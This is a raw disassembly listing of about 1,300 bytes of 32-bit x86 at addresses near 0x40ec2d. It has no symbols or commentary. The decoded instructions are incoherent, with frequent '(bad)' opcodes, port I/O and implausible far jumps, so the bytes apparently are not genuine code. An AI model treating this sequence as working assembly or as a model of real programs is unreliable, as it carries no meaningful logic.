  40ec2d:	ins    BYTE PTR es:[edi],dx
  40ec2e:	in     al,0xd8
  40ec30:	or     ecx,DWORD PTR [ecx+0x6fdfd00b]
  40ec36:	aas    
  40ec37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec38:	jo     0x40ebf5
  40ec3a:	es mov bl,0x92
  40ec3d:	fld    QWORD PTR ds:0xdb2cf666
  40ec43:	sub    ch,BYTE PTR ds:0xa79f3f78
  40ec49:	bound  esi,QWORD PTR [ecx-0x26]
  40ec4c:	(bad)  
  40ec4d:	enter  0x990,0x52
  40ec51:	and    cl,bh
  40ec53:	adc    eax,0x39affef9
  40ec58:	addr16 xor eax,0xdbb29177
  40ec5e:	mov    ds:0xc7a02733,eax
  40ec63:	xchg   ecx,eax
  40ec64:	dec    ecx
  40ec65:	add    al,0x2c
  40ec67:	xchg   ebp,eax
  40ec68:	clc    
  40ec69:	aad    0x62
  40ec6b:	fdiv   st,st(3)
  40ec6d:	mov    BYTE PTR [ebx-0x5a],dh
  40ec70:	out    0x47,al
  40ec72:	pop    esp
  40ec73:	ss hlt 
  40ec75:	mov    cl,0xd1
  40ec77:	les    esi,FWORD PTR [edx+0x515142cd]
  40ec7d:	jl     0x40ec23
  40ec7f:	aam    0x49
  40ec81:	mov    ebp,0x847de6f3
  40ec86:	je     0x40ec0c
  40ec88:	addr16 jne 0x40ed0a
  40ec8b:	or     DWORD PTR [ebx-0x24cc13e0],ebx
  40ec91:	inc    edx
  40ec92:	arpl   bx,ax
  40ec94:	add    esp,edx
  40ec96:	jno    0x40ed02
  40ec98:	popa   
  40ec99:	jnp    0x40ec7c
  40ec9b:	adc    bh,BYTE PTR [ecx]
  40ec9d:	jo     0x40ec54
  40ec9f:	add    bh,BYTE PTR [ebp-0x1deb17f1]
  40eca5:	dec    eax
  40eca6:	push   eax
  40eca7:	cli    
  40eca8:	mov    ebp,DWORD PTR [esi-0x62]
  40ecab:	jns    0x40ecd3
  40ecad:	jmp    DWORD PTR [edi+edx*8]
  40ecb0:	out    0x25,eax
  40ecb2:	cli    
  40ecb3:	jp     0x40ecdf
  40ecb5:	pop    ebx
  40ecb6:	je     0x40ec85
  40ecb8:	cdq    
  40ecb9:	dec    edx
  40ecba:	mov    bl,0xe5
  40ecbc:	xchg   ebx,eax
  40ecbd:	push   ds
  40ecbe:	div    BYTE PTR [eax+0x5e5a58b8]
  40ecc4:	mov    BYTE PTR [ebx],cl
  40ecc6:	sbb    al,BYTE PTR [ebx]
  40ecc8:	sbb    eax,0x2bd0bbd9
  40eccd:	shl    eax,cl
  40eccf:	or     bh,BYTE PTR [edi+ecx*2+0x5a650c41]
  40ecd6:	mov    BYTE PTR [eax-0x30],al
  40ecd9:	dec    ecx
  40ecda:	or     dl,BYTE PTR [edx+0xb]
  40ecdd:	gs int3 
  40ecdf:	push   eax
  40ece0:	ins    DWORD PTR es:[edi],dx
  40ece1:	mov    dh,0x82
  40ece3:	push   edi
  40ece4:	aad    0x64
  40ece6:	mov    eax,ds:0x53542768
  40eceb:	test   al,0xec
  40eced:	in     eax,dx
  40ecee:	sbb    esi,DWORD PTR [ecx]
  40ecf0:	enter  0x2a92,0xa9
  40ecf4:	es pop eax
  40ecf6:	sti    
  40ecf7:	(bad)  
  40ecf8:	fbld   TBYTE PTR [ecx+0x6e]
  40ecfb:	call   ecx
  40ecfd:	ss popf 
  40ecff:	sub    edx,DWORD PTR [eax-0x2d736299]
  40ed05:	adc    cl,cl
  40ed07:	daa    
  40ed08:	mov    eax,0xba9bd509
  40ed0d:	push   ds
  40ed0e:	push   edi
  40ed0f:	es dec ecx
  40ed11:	xlat   BYTE PTR ds:[ebx]
  40ed12:	xchg   edx,eax
  40ed13:	out    dx,al
  40ed14:	repz clc 
  40ed16:	add    al,BYTE PTR [edi+0x2]
  40ed19:	sub    DWORD PTR [ecx+0x2e],esp
  40ed1c:	sub    eax,esi
  40ed1e:	(bad)  
  40ed1f:	mov    ebp,0x18979bfc
  40ed24:	jo     0x40ed90
  40ed26:	mov    edx,0xe2d72fde
  40ed2b:	out    0x6e,eax
  40ed2d:	dec    esp
  40ed2e:	fs xchg edx,eax
  40ed30:	stos   BYTE PTR es:[edi],al
  40ed31:	ror    bh,cl
  40ed33:	nop
  40ed34:	outs   dx,BYTE PTR ds:[esi]
  40ed35:	out    dx,al
  40ed36:	xor    ebx,esp
  40ed38:	inc    ecx
  40ed39:	ds mov al,fs:0xac26edad
  40ed40:	scas   eax,DWORD PTR es:[edi]
  40ed41:	xchg   esp,eax
  40ed42:	mov    ds:0xbc941c3b,eax
  40ed47:	mov    al,0x36
  40ed49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed4a:	ss mov ecx,0x47e207bc
  40ed50:	sub    DWORD PTR [edx],0x79
  40ed53:	sbb    esp,edi
  40ed55:	jle    0x40ed0e
  40ed57:	jg     0x40ecdc
  40ed59:	dec    edx
  40ed5a:	das    
  40ed5b:	jge    0x40ece1
  40ed5d:	xchg   esi,eax
  40ed5e:	jp     0x40ed68
  40ed60:	gs pop ds
  40ed62:	cmp    DWORD PTR [esi-0x3a],edi
  40ed65:	or     eax,0x6bc1312
  40ed6a:	fcomip st,st(6)
  40ed6c:	mov    ds:0xa23567ff,eax
  40ed71:	mov    eax,ds:0x35a44476
  40ed76:	push   ds
  40ed77:	test   DWORD PTR [ebx+0x3c],esp
  40ed7a:	stos   DWORD PTR es:[edi],eax
  40ed7b:	aam    0x7f
  40ed7d:	jb     0x40edb1
  40ed7f:	retf   0xe2fb
  40ed82:	sub    al,0xd9
  40ed84:	mov    esi,0x297d71ba
  40ed89:	in     al,dx
  40ed8a:	loop   0x40ed7c
  40ed8c:	xor    eax,esp
  40ed8e:	fs mov bl,0xd
  40ed91:	jb     0x40edfa
  40ed93:	inc    esp
  40ed94:	ret    
  40ed95:	mov    ah,BYTE PTR [ebx]
  40ed97:	or     BYTE PTR [ebx-0x4cdb35],cl
  40ed9d:	je     0x40ed6f
  40ed9f:	lods   al,BYTE PTR ds:[esi]
  40eda0:	or     al,0xef
  40eda2:	imul   BYTE PTR [esi+0x6888d3fc]
  40eda8:	mov    DWORD PTR [ecx-0x72d0c322],ebx
  40edae:	aad    0x71
  40edb0:	(bad)  
  40edb1:	jb     0x40ed8a
  40edb3:	inc    ebp
  40edb4:	mov    ch,0x48
  40edb6:	ins    BYTE PTR es:[edi],dx
  40edb7:	sahf   
  40edb8:	add    ebp,esp
  40edba:	outs   dx,DWORD PTR ds:[esi]
  40edbb:	pop    ebx
  40edbc:	lock push es
  40edbe:	fild   QWORD PTR [ebx]
  40edc0:	jl     0x40edcb
  40edc2:	sbb    DWORD PTR [edi],edx
  40edc4:	cli    
  40edc5:	dec    eax
  40edc6:	outs   dx,BYTE PTR ds:[esi]
  40edc7:	mov    ebx,0x6d87b8a5
  40edcc:	out    dx,eax
  40edcd:	xchg   ebx,eax
  40edce:	lds    esp,FWORD PTR [ecx+esi*2-0x39ced7b6]
  40edd5:	sbb    DWORD PTR ds:0x83c86e64,edx
  40eddb:	adc    bl,BYTE PTR [ebx]
  40eddd:	xchg   edx,eax
  40edde:	adc    cl,BYTE PTR [ebp+0x33dbe291]
  40ede4:	mov    cl,cl
  40ede6:	test   DWORD PTR [edx-0x3f1bdc2a],eax
  40edec:	xchg   edi,eax
  40eded:	call   0x9b18:0x9b66f354
  40edf4:	adc    DWORD PTR [ecx+0x1312e459],ebp
  40edfa:	ins    BYTE PTR es:[edi],dx
  40edfb:	inc    edi
  40edfc:	scas   eax,DWORD PTR es:[edi]
  40edfd:	pusha  
  40edfe:	jb     0x40edec
  40ee00:	xor    eax,0x9ccae488
  40ee05:	(bad)  
  40ee06:	jge    0x40ee5c
  40ee08:	fidivr WORD PTR [edx+0x18]
  40ee0b:	cmc    
  40ee0c:	mov    ebx,0x48e6594c
  40ee11:	xor    esp,edx
  40ee13:	adc    si,di
  40ee16:	or     esi,DWORD PTR [eax]
  40ee18:	in     al,dx
  40ee19:	pcmpgtw mm2,QWORD PTR [esi]
  40ee1c:	jnp    0x40ee3f
  40ee1e:	test   DWORD PTR [edi+0x20b71c45],eax
  40ee24:	outs   dx,DWORD PTR ds:[esi]
  40ee25:	pop    ds
  40ee26:	push   esp
  40ee27:	adc    dl,BYTE PTR [ecx-0x45ffa440]
  40ee2d:	frstor [edi]
  40ee2f:	and    eax,0x4bef4374
  40ee34:	jno    0x40ee4d
  40ee36:	pusha  
  40ee37:	lea    eax,[ebx]
  40ee39:	stos   DWORD PTR es:[edi],eax
  40ee3a:	sub    BYTE PTR [ecx],bh
  40ee3c:	adc    al,0xb9
  40ee3e:	inc    ebp
  40ee3f:	sub    eax,0x4e97c9
  40ee44:	cdq    
  40ee45:	xchg   edi,eax
  40ee46:	lods   eax,DWORD PTR ds:[esi]
  40ee47:	xor    al,0x81
  40ee49:	pop    esp
  40ee4a:	mov    ds,WORD PTR [edi+0x1c3f0751]
  40ee50:	call   0xb6efc45e
  40ee55:	stos   BYTE PTR es:[edi],al
  40ee56:	mov    ds:0x4bedae3f,eax
  40ee5b:	jmp    0xc59:0x90b70d0c
  40ee62:	shl    dh,cl
  40ee64:	mov    bl,0xcf
  40ee66:	nop
  40ee67:	mov    ds:0xf88a0d05,eax
  40ee6c:	shl    BYTE PTR [ebx+0x6b7ec23e],1
  40ee72:	pop    ds
  40ee73:	bound  ebx,QWORD PTR [edi]
  40ee75:	nop
  40ee76:	add    ebx,DWORD PTR [edi]
  40ee78:	sbb    ebp,ecx
  40ee7a:	mov    eax,0x88b44ffd
  40ee7f:	mov    ebx,0x2a31363d
  40ee84:	loopne 0x40ee72
  40ee86:	mov    edx,edx
  40ee88:	aaa    
  40ee89:	push   0x7ce9c445
  40ee8e:	sbb    bh,BYTE PTR [eax]
  40ee90:	inc    edi
  40ee91:	pop    ss
  40ee92:	sub    eax,0x3bffbd40
  40ee97:	pop    esi
  40ee98:	mov    al,0x5c
  40ee9a:	mov    ebp,0x9fb7a20c
  40ee9f:	dec    ebx
  40eea0:	cmp    al,0xa3
  40eea2:	jge    0x40eef5
  40eea4:	gs pushf 
  40eea6:	sbb    cl,BYTE PTR [edi-0x28]
  40eea9:	aaa    
  40eeaa:	mov    ebp,DWORD PTR [edi+0x8]
  40eead:	pop    ebx
  40eeae:	es xchg ebx,eax
  40eeb0:	ins    DWORD PTR es:[edi],dx
  40eeb1:	push   0x1c
  40eeb3:	rol    dl,0x52
  40eeb6:	ins    BYTE PTR es:[edi],dx
  40eeb7:	push   edi
  40eeb9:	out    dx,al
  40eeba:	add    DWORD PTR [edi-0xa],eax
  40eebd:	jg     0x40eeff
  40eebf:	pop    ebp
  40eec0:	xor    DWORD PTR [ebp+0x58],0x28
  40eec4:	mov    edx,0xa7f2a800
  40eec9:	fimul  DWORD PTR [edx+0x7e]
  40eecc:	push   ds
  40eecd:	scas   al,BYTE PTR es:[edi]
  40eece:	mov    esp,0xf8330b9f
  40eed3:	push   esi
  40eed4:	pop    ebp
  40eed5:	adc    dh,BYTE PTR [ecx+0x76]
  40eed8:	daa    
  40eed9:	jae    0x40ef04
  40eedb:	add    bl,BYTE PTR [eax]
  40eedd:	mov    dh,0x4f
  40eedf:	pop    edx
  40eee0:	aam    0x50
  40eee2:	add    BYTE PTR [esi],ch
  40eee4:	test   BYTE PTR [edx+0x710e9db8],al
  40eeea:	adc    al,al
  40eeec:	enter  0x2a7f,0xf5
  40eef0:	mov    WORD PTR [ecx-0x72845d17],ss
  40eef6:	fmul   st(7),st
  40eef8:	shl    BYTE PTR [edx+0x23],cl
  40eefb:	rcr    BYTE PTR [edx+0x666f4eb1],0x2e
  40ef02:	call   0x25105dd9
  40ef07:	xor    eax,DWORD PTR [ecx]
  40ef09:	jg     0x40ef75
  40ef0b:	xchg   ecx,eax
  40ef0c:	mov    BYTE PTR [ebp+0x11],dh
  40ef0f:	sti    
  40ef10:	xchg   DWORD PTR [edx],eax
  40ef12:	cwde   
  40ef13:	imul   esp,ecx,0x5e82d577
  40ef19:	ins    BYTE PTR es:[edi],dx
  40ef1a:	push   cs
  40ef1b:	and    al,0x53
  40ef1d:	or     esi,DWORD PTR [edi-0x34]
  40ef20:	sub    DWORD PTR [esi-0x15],edx
  40ef23:	adc    DWORD PTR [ecx+0x6c],0xffffffa7
  40ef27:	mov    cl,0x24
  40ef29:	inc    eax
  40ef2a:	jl     0x40ef2d
  40ef2c:	aad    0xc3
  40ef2e:	outs   dx,BYTE PTR fs:[esi]
  40ef30:	dec    esp
  40ef31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef32:	(bad)  
  40ef33:	pop    ss
  40ef34:	rcl    DWORD PTR [ebx-0x7f17c93e],1
  40ef3a:	pop    edi
  40ef3b:	lods   eax,DWORD PTR ds:[esi]
  40ef3c:	sub    al,0x95
  40ef3e:	mov    ah,0xd
  40ef40:	cmp    edx,DWORD PTR [edx-0x59b76251]
  40ef46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef47:	xor    ebx,DWORD PTR [ecx+0x14]
  40ef4a:	mov    eax,0xbb23f36
  40ef4f:	xchg   ebx,eax
  40ef50:	cdq    
  40ef51:	cld    
  40ef52:	cmp    DWORD PTR [ebp-0x60c964e5],0xffffffd1
  40ef59:	or     BYTE PTR [eax-0x1c06fd94],cl
  40ef5f:	push   eax
  40ef60:	cmp    edi,0x0
  40ef63:	push   ss
  40ef64:	push   ss
  40ef65:	xor    DWORD PTR [ecx-0x12a44fed],edi
  40ef6b:	mov    bh,0x3d
  40ef6d:	cmp    dh,bl
  40ef6f:	lock jns 0x40efe1
  40ef72:	comiss xmm6,DWORD PTR [esp+eax*2]
  40ef76:	push   cs
  40ef77:	dec    esi
  40ef78:	idiv   ebp
  40ef7a:	sub    esp,DWORD PTR [edi+0x2]
  40ef7d:	jne    0x40ef03
  40ef7f:	inc    esi
  40ef80:	lea    ebp,[edi+0x3970e2c6]
  40ef86:	fnsave [eax]
  40ef88:	aam    0x9f
  40ef8a:	mov    ds:0x74fda068,al
  40ef8f:	sbb    ebx,esi
  40ef91:	lahf   
  40ef92:	(bad)  [ebx]
  40ef94:	or     dl,BYTE PTR ds:0x41acdec9
  40ef9a:	pop    edx
  40ef9b:	ins    BYTE PTR es:[edi],dx
  40ef9c:	xlat   BYTE PTR ds:[ebx]
  40ef9d:	push   eax
  40ef9e:	pop    esp
  40ef9f:	nop
  40efa0:	cld    
  40efa1:	sbb    bh,BYTE PTR [esi]
  40efa3:	xchg   ecx,eax
  40efa4:	shl    DWORD PTR [ebx-0xe390b90],cl
  40efaa:	pop    ebx
  40efab:	add    DWORD PTR [esi+0x1d9fe7e6],edi
  40efb1:	push   esp
  40efb2:	mov    ebp,0xb00d5c79
  40efb7:	(bad)  
  40efb8:	es leave 
  40efba:	push   ss
  40efbb:	loopne 0x40ef71
  40efbd:	or     edi,ebx
  40efbf:	jecxz  0x40ef5c
  40efc1:	stos   DWORD PTR es:[edi],eax
  40efc2:	jl     0x40ef77
  40efc4:	fiadd  DWORD PTR [edx]
  40efc6:	inc    eax
  40efc7:	mov    ebx,0xb800af32
  40efcc:	add    al,0xa1
  40efce:	ja     0x40eff6
  40efd0:	jae    0x40f020
  40efd2:	out    dx,al
  40efd3:	push   0x9700a0d0
  40efd8:	nop
  40efd9:	pop    ss
  40efda:	xor    al,0x72
  40efdc:	jge    0x40f05c
  40efde:	sub    dl,ch
  40efe0:	cmp    al,0x9e
  40efe2:	fldenv [esi+eax*2-0x66]
  40efe6:	or     al,0x6e
  40efe8:	ds aaa 
  40efea:	nop
  40efeb:	dec    ebp
  40efec:	jns    0x40f064
  40efee:	sbb    DWORD PTR [edi+0x74de87cc],eax
  40eff4:	sbb    ah,bh
  40eff6:	into   
  40eff7:	push   ebp
  40eff8:	aad    0x3c
  40effa:	xchg   esi,eax
  40effb:	push   cs
  40effc:	sbb    cl,0x88
  40efff:	mov    ch,0x1e
  40f001:	daa    
  40f002:	ins    BYTE PTR es:[edi],dx
  40f003:	pop    edi
  40f004:	sbb    DWORD PTR [ebx+0x3e],ebp
  40f007:	clc    
  40f008:	popa   
  40f009:	push   ds
  40f00a:	repz sub esp,DWORD PTR [ecx-0x670bbce7]
  40f011:	mov    dl,0x52
  40f013:	popf   
  40f014:	pusha  
  40f015:	xor    bl,BYTE PTR [esi-0xd]
  40f018:	stc    
  40f019:	sbb    eax,0xc8b17261
  40f01e:	rcl    BYTE PTR [edi+ebx*4-0x43],1
  40f022:	aam    0x57
  40f024:	mov    BYTE PTR [esi+0x3],ch
  40f027:	and    BYTE PTR [ecx],bh
  40f029:	ja     0x40efd8
  40f02b:	mov    eax,0x55f6f665
  40f030:	and    eax,0xcbcc20c2
  40f035:	mov    edi,0xc438bcae
  40f03a:	pop    es
  40f03b:	daa    
  40f03c:	pop    ss
  40f03d:	add    edi,esp
  40f03f:	mov    ds:0x1579ac71,eax
  40f044:	jae    0x40f018
  40f046:	clc    
  40f047:	lds    eax,FWORD PTR fs:[ecx]
  40f04a:	mov    DWORD PTR [esi+0x25],0xe3a30b7a
  40f051:	xchg   ebp,eax
  40f052:	mov    dl,0x14
  40f054:	mov    ch,al
  40f056:	inc    eax
  40f057:	data16 (bad) 
  40f059:	fmul   QWORD PTR [esi+edx*8+0xa]
  40f05d:	adc    eax,0x4fe1dda
  40f062:	ds pop esi
  40f064:	lods   eax,DWORD PTR ds:[esi]
  40f065:	sbb    eax,0x7abc6885
  40f06a:	ret    0x4aa0
  40f06d:	mov    ecx,0xdfd8e859
  40f072:	or     al,0x95
  40f074:	lods   al,BYTE PTR ds:[esi]
  40f075:	xlat   BYTE PTR ds:[ebx]
  40f076:	mov    ch,0x39
  40f078:	jmp    FWORD PTR [ebx+esi*2-0xb]
  40f07c:	push   ss
  40f07d:	push   ebp
  40f07e:	adc    DWORD PTR [eax+0x139cbecc],0xa0f6e737
  40f088:	jb     0x40f0c4
  40f08a:	test   BYTE PTR [ecx-0x491b8e9a],ah
  40f090:	cwde   
  40f091:	mov    al,0x22
  40f093:	fdiv   DWORD PTR [esi+ebp*2+0x6891aaab]
  40f09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f09b:	mov    ebx,DWORD PTR fs:[edx+ebx*8+0x40c4de32]
  40f0a3:	sub    eax,0xb5bdde18
  40f0a8:	fwait
  40f0a9:	sub    eax,0x66a99433
  40f0ae:	sahf   
  40f0af:	test   eax,0x2ffedddc
  40f0b4:	dec    edi
  40f0b5:	bound  ebp,QWORD PTR [ebp+edi*1+0x34178b80]
  40f0bc:	jae    0x40f12c
  40f0be:	xlat   BYTE PTR ds:[ebx]
  40f0bf:	inc    edx
  40f0c0:	into   
  40f0c1:	mov    esi,0x682349b8
  40f0c6:	pop    si
  40f0c8:	sub    dl,BYTE PTR [edi+0xc1fb220]
  40f0ce:	idiv   DWORD PTR [eax-0x4d4e5f67]
  40f0d4:	and    cl,dl
  40f0d6:	or     eax,0x10687b25
  40f0db:	call   0x336a8fed
  40f0e0:	lahf   
  40f0e1:	pop    ds
  40f0e2:	dec    edi
  40f0e3:	mov    DWORD PTR [eax-0x7f],eax
  40f0e6:	call   0xd31f1eba
  40f0eb:	xor    al,0x75
  40f0ed:	fs sbb eax,0xf8be1bfd
  40f0f3:	cwde   
  40f0f4:	cwde   
  40f0f5:	sub    BYTE PTR [ecx+0x45],ch
  40f0f8:	imul   esi,ebp,0xffffffcb
  40f0fb:	popf   
  40f0fc:	sahf   
  40f0fd:	outs   dx,DWORD PTR ds:[esi]
  40f0fe:	ret    0xd2fc
  40f101:	cmc    
  40f102:	fs test eax,0x45e3df8f
  40f108:	retf   0x78d9
  40f10b:	sub    eax,0x1e6d4dd6
  40f110:	pop    edi
  40f111:	fs push esi
  40f113:	hlt    
  40f114:	mov    cl,0x53
  40f116:	cmc    
  40f117:	inc    ebx
  40f118:	add    DWORD PTR [eax-0x678de58f],0xfffffff7
  40f11f:	mov    eax,0x8b1456b1
  40f124:	out    0x4a,al
  40f126:	pop    ecx
  40f127:	jmp    0xc610:0x553b3e68
  40f12e:	inc    ebp
  40f12f:	and    cl,ch
  40f131:	scas   eax,DWORD PTR es:[edi]
  40f132:	dec    ebx
  40f133:	pop    ecx
  40f134:	idiv   BYTE PTR [ebx-0x6c5f1527]
  40f13a:	mov    dl,dl
  40f13c:	xor    eax,0x472984ab
  40f141:	or     al,0x18
  40f143:	gs inc eax
  40f145:	(bad)  
  40f146:	sti    
  40f147:	cmp    al,0xbb
  40f149:	jg     0x40f128
  40f14b:	push   ebp
  40f14c:	push   esp
  40f14d:	or     esp,DWORD PTR [edx+0x6e]
  40f150:	cld    
  40f151:	push   es
  40f152:	outs   dx,DWORD PTR ds:[esi]
  40f153:	(bad)  
  40f155:	mov    esi,0xeac8cfdb
  40f15a:	les    esi,FWORD PTR [edx]
  40f15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f15d:	mov    edx,0x280eeb58
  40f162:	dec    edi
  40f163:	lods   al,BYTE PTR ds:[esi]
  40f164:	les    ebx,FWORD PTR [esi]
  40f166:	mov    ah,0xde
  40f168:	mov    bh,0x8a
  40f16a:	daa    
  40f16b:	inc    edx
  40f16c:	fcmovnbe st,st(3)
  40f16e:	cmp    eax,DWORD PTR [ecx+eiz*8]
  40f171:	jbe    0x40f164
  40f173:	mov    ah,0x9f
  40f175:	add    BYTE PTR [ebx],dh
  40f177:	jne    0x40f1ec
  40f179:	fistp  WORD PTR [ecx-0x64]
  40f17c:	call   0x55f25d28
  40f181:	dec    ecx
  40f182:	adc    DWORD PTR [ebx-0x17],eax
  40f185:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f186:	jae    0x40f190
  40f188:	dec    eax
  40f189:	dec    ebx
  40f18a:	adc    eax,0x7e9ce90b
  40f18f:	test   dh,ch
  40f191:	push   0xc
  40f193:	ins    BYTE PTR es:[edi],dx
  40f194:	add    al,0xd6
  40f196:	adc    BYTE PTR ds:0xb65df1e7,bh
  40f19c:	bound  edi,QWORD PTR [ebx-0x31]
  40f19f:	inc    ecx
  40f1a0:	sub    al,0xa6
  40f1a2:	adc    bl,BYTE PTR [ecx-0x71]
  40f1a5:	push   cs
  40f1a6:	sbb    bh,BYTE PTR [eax-0x7]
  40f1a9:	sub    eax,DWORD PTR [esi-0x5c]
  40f1ac:	pop    ebx
  40f1ad:	lds    edx,FWORD PTR [ebx-0x6f2aeb5d]
  40f1b3:	mov    esi,0xe5cf4d76
  40f1b8:	idiv   ebp
  40f1ba:	pop    es
  40f1bb:	pop    ecx
  40f1bc:	cmp    eax,0x31b1c4b9
  40f1c1:	xchg   esp,eax
  40f1c2:	cld    
  40f1c3:	and    bh,bh
  40f1c5:	loope  0x40f18f
  40f1c7:	mov    bh,dl
  40f1c9:	bound  eax,QWORD PTR [esp+ecx*4]
  40f1cc:	call   0x5a6a:0xaaff930d
  40f1d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1d4:	icebp  
  40f1d5:	out    0x8d,al
  40f1d7:	mov    ds:0xfde5f256,eax
  40f1dc:	fild   QWORD PTR [ebp+0x35887abd]
  40f1e2:	imul   edx,DWORD PTR [edi+0x7900910],0xa90edace
  40f1ec:	loopne 0x40f227
  40f1ee:	push   eax
  40f1ef:	inc    ecx
  40f1f0:	adc    dh,BYTE PTR [edx-0x40]
  40f1f3:	xchg   ecx,eax
  40f1f4:	mov    eax,DWORD PTR [esi+0x72]
  40f1f7:	(bad)  
  40f1f8:	rol    DWORD PTR [ebp+0x7381715c],1
  40f1fe:	retf   
  40f1ff:	xor    edi,ebx
  40f201:	fwait
  40f202:	leave  
  40f203:	sbb    ch,cl
  40f205:	or     ebx,edi
  40f207:	push   esi
  40f208:	and    ah,cl
  40f20a:	jb     0x40f270
  40f20c:	pop    ebx
  40f20d:	and    al,BYTE PTR [ebx+edi*4]
  40f210:	pop    ebp
  40f211:	push   esi
  40f212:	imul   eax,DWORD PTR [ebx],0x9a24dcc3
  40f218:	jp     0x40f1b7
  40f21a:	out    0xdf,al
  40f21c:	dec    esi
  40f21d:	add    cl,BYTE PTR ds:0x636b0172
  40f223:	xchg   edi,eax
  40f224:	(bad)  
  40f225:	mov    ecx,0x5d6c734a
  40f22a:	(bad)  
  40f22b:	xor    al,0x95
  40f22d:	jo     0x40f1cb
  40f22f:	and    esp,DWORD PTR [ebx]
  40f231:	jge    0xf7afabbd
  40f237:	es out 0x80,al
  40f23a:	or     dh,BYTE PTR [ecx+0x3b]
  40f23d:	addr16 dec edi
  40f23f:	lds    edx,FWORD PTR [ecx]
  40f241:	xor    eax,DWORD PTR [edi]
  40f243:	in     al,0xbb
  40f245:	call   0xb23:0xadea938c
  40f24c:	lahf   
  40f24d:	push   es
  40f24e:	nop
  40f24f:	addr16 pushf 
  40f251:	leave  
  40f252:	push   es
  40f253:	cmc    
  40f254:	dec    eax
  40f255:	idiv   BYTE PTR [edi-0x799f0696]
  40f25b:	arpl   si,bp
  40f25d:	test   eax,0xaad8f43a
  40f262:	inc    edi
  40f263:	lea    esp,[ecx]
  40f265:	leave  
  40f266:	inc    edx
  40f267:	and    DWORD PTR [ebp+0x5b],ebx
  40f26a:	push   ds
  40f26b:	and    eax,0xc204c44
  40f270:	mov    ah,0xcd
  40f272:	js     0x40f273
  40f274:	fwait
  40f275:	inc    ecx
  40f276:	inc    esp
  40f277:	push   0xc30ea76f
  40f27c:	jno    0x40f240
  40f27e:	push   cs
  40f27f:	outs   dx,BYTE PTR ds:[esi]
  40f280:	adc    al,0xb
  40f282:	jnp    0x40f2b2
  40f284:	repz cmc 
  40f286:	(bad)  
  40f287:	out    0xf9,al
  40f289:	test   BYTE PTR [edx-0xa],bh
  40f28c:	lahf   
  40f28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28e:	(bad)  
  40f290:	pop    edx
  40f291:	bound  edi,QWORD PTR [edi]
  40f293:	cmp    DWORD PTR [edx],esp
  40f295:	sub    ecx,esi
  40f297:	dec    ebp
  40f298:	cld    
  40f299:	hlt    
  40f29a:	xchg   ecx,eax
  40f29b:	xor    BYTE PTR [eax],bl
  40f29d:	jno    0x40f304
  40f29f:	clc    
  40f2a0:	mov    dl,0xbe
  40f2a2:	sahf   
  40f2a3:	aaa    
  40f2a4:	fstp   QWORD PTR ds:0xfe447c9b
  40f2aa:	adc    esp,DWORD PTR [esi]
  40f2ac:	fadd   st(1),st
  40f2ae:	sbb    DWORD PTR [ecx],edi
  40f2b0:	inc    ecx
  40f2b1:	iret   
  40f2b2:	jecxz  0x40f2bf
  40f2b4:	mov    ebx,0x2b40b5d4
  40f2b9:	scas   eax,DWORD PTR es:[edi]
  40f2ba:	cwde   
  40f2bb:	out    0xcf,al
  40f2bd:	fisub  WORD PTR [ebx-0x10c9cd97]
  40f2c3:	add    eax,0x1e337a4d
  40f2c8:	dec    eax
  40f2c9:	mov    ch,0x31
  40f2cb:	inc    esi
  40f2cc:	push   eax
  40f2cd:	jmp    0x1a639696
  40f2d2:	and    bl,BYTE PTR [edx-0x6a]
  40f2d5:	push   cs
  40f2d6:	adc    DWORD PTR [ecx+0x21],eax
  40f2d9:	test   al,0x3c
  40f2db:	stc    
  40f2dc:	pop    es
  40f2dd:	dec    esp
  40f2de:	outs   dx,BYTE PTR ds:[esi]
  40f2df:	xor    DWORD PTR [eax],esp
  40f2e1:	bound  esi,QWORD PTR [edx]
  40f2e3:	fwait
  40f2e4:	mov    ds:0x7fbf4ad7,eax
  40f2e9:	popf   
  40f2ea:	mov    eax,0xd37cb82a
  40f2ef:	ins    DWORD PTR es:[edi],dx
  40f2f0:	sub    eax,0xb66f2d9
  40f2f5:	push   edi
  40f2f6:	shr    ah,cl
  40f2f8:	fimul  WORD PTR [eax+0x3f]
  40f2fb:	(bad)  
  40f2fc:	push   ecx
  40f2fd:	aas    
  40f2fe:	or     DWORD PTR [eax+eax*4-0x6376aeec],edi
  40f305:	cmc    
  40f306:	out    0x68,eax
  40f308:	pop    ds
  40f309:	mov    edi,0xa296caba
  40f30e:	sbb    eax,0x81edee86
  40f313:	pop    ebp
  40f314:	inc    ebp
  40f315:	mov    DWORD PTR [eax],ecx
  40f317:	addr16 mov eax,?
  40f31a:	sbb    eax,0x47a4ce11
  40f31f:	inc    edx
  40f321:	push   ds
  40f322:	imul   edx,DWORD PTR [esi-0x5b98a54a],0x1331f6bc
  40f32c:	mov    dh,0x87
  40f32e:	xlat   BYTE PTR ds:[ebx]
  40f32f:	popf   
  40f330:	sbb    al,0x77
  40f332:	ins    DWORD PTR es:[edi],dx
  40f333:	sbb    BYTE PTR [ecx-0x24f8c47a],dl
  40f339:	and    al,0x35
  40f33b:	push   edi
  40f33c:	inc    esi
  40f33d:	adc    cl,bl
  40f33f:	das    
  40f340:	adc    DWORD PTR [ecx+0x42cb6992],edi
  40f346:	test   DWORD PTR [ecx-0x6e],eax
  40f349:	dec    ecx
  40f34a:	pop    edx
  40f34b:	mov    eax,ds:0x4dc1ccb6
  40f350:	jge    0x40f2d2
  40f352:	mov    dl,0xa2
  40f354:	lock test edx,ebx
  40f357:	repnz lahf 
  40f359:	xchg   edi,eax
  40f35a:	(bad)  [esi-0x76bf0946]
  40f360:	jg     0x40f381
  40f362:	xor    eax,0xa5415fc0
  40f367:	in     al,dx
  40f368:	push   es
  40f369:	into   
  40f36a:	mov    ebx,0x404e9134
  40f36f:	mov    bl,0xa7
  40f371:	mov    WORD PTR [ecx],?
  40f373:	(bad)  
  40f374:	aad    0x0
  40f376:	iret   
  40f377:	hlt    
  40f378:	xchg   ebp,eax
  40f379:	outs   dx,DWORD PTR ds:[esi]
  40f37a:	(bad)  
